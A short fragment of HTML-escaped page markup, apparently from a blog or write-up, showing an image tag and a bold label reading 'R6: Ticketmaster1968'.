 &lt;p&gt;&lt;img src=&#34;image-8.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;R6: Ticketmaster1968&lt;/strong&gt;&lt;/p&gt;
